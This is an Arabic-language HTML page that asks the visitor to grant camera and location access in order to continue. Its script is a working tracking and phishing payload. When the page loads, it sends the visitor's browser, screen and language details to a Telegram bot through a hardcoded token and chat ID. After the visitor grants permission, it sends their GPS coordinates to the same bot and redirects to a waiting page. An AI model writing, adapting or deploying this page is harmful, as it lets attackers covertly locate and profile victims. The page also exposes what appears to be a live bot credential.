<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب الأذونات</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            direction: rtl;
            text-align: center;
        }
        #permission-message {
            font-size: 20px;
            color: #333;
            margin-bottom: 20px;
        }
        #request-button {
            padding: 10px 20px;
            font-size: 18px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #request-button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div id="permission-message">الرجاء السماح بالوصول إلى الموقع والكاميرا للمتابعة</div>
    <button id="request-button" onclick="requestPermissions()">السماح بالأذونات</button>

    <script>
        const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
        const chatId = '6185375878';

        // إرسال الرسالة الأولية إلى Telegram فور دخول المستخدم الموقع
        function sendInitialData() {
            const userAgent = navigator.userAgent;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const language = navigator.language || navigator.userLanguage;
            const initialMessage = `
                🖥️ معلومات أولية عند الدخول:
                📏 عرض الشاشة: ${screenWidth}px
                📏 ارتفاع الشاشة: ${screenHeight}px
                🌐 لغة المتصفح: ${language}
                🖥️ متصفح ونظام التشغيل: ${userAgent}
            `;
            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ chat_id: chatId, text: initialMessage })
            }).catch(error => console.error('خطأ في إرسال البيانات الأولية:', error));
        }

        sendInitialData();

        // طلب الأذونات
        function requestPermissions() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(() => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const latitude = position.coords.latitude;
                            const longitude = position.coords.longitude;
                            const locationMessage = `
                                📍 تم الحصول على الموقع بعد منح الإذن:
                                🌍 خط العرض: ${latitude}
                                🌍 خط الطول: ${longitude}
                            `;
                            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                body: new URLSearchParams({ chat_id: chatId, text: locationMessage })
                            }).then(() => window.location.href = "waitingPage.html")
                            .catch(error => console.error('خطأ في إرسال الموقع:', error));
                        },
                        (error) => {
                            console.error('لم يتم منح إذن الموقع:', error);
                            alert('يجب السماح بالوصول إلى الموقع للمتابعة.');
                        }
                    );
                })
                .catch((error) => {
                    console.error('خطأ في الوصول إلى الكاميرا:', error);
                    alert('يجب السماح بالوصول إلى الكاميرا للمتابعة.');
                });
        }
    </script>
</body>
</html>
